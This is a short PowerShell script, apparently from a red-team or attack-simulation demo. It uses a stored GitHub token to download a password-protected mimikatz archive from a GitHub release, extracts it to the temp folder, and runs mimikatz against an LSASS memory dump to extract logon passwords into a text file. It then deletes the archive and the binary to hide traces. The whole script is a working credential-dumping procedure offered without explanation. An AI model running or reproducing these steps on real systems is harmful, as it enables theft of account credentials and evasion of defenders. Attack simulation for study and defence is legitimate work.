$tkn= Get-Content "C:\CRDemo\tkn.txt"; $headers=@{"Authorization"="token ghp_"+$tkn; "Accept"="application/octet-stream"}; Invoke-WebRequest "https://api.github.com/repos/tameval/poc124509/releases/assets/81648140" -Headers $headers -OutFile $env:TEMP\enc_mimikatz.zip
cmd.exe /c '"C:\Program Files\7-Zip\7z.exe" e -ppassword123 -o%TEMP% %TEMP%\enc_mimikatz.zip'
Remove-Item $env:TEMP\enc_mimikatz.zip
cd $env:TEMP
.\mimikatz.exe "sekurlsa::minidump %TEMP%\lsass.dmp" "sekurlsa::logonpasswords" "exit" | Out-File ($Env:TEMP + "\mimihash.txt")
Remove-Item $env:TEMP\mimikatz.exe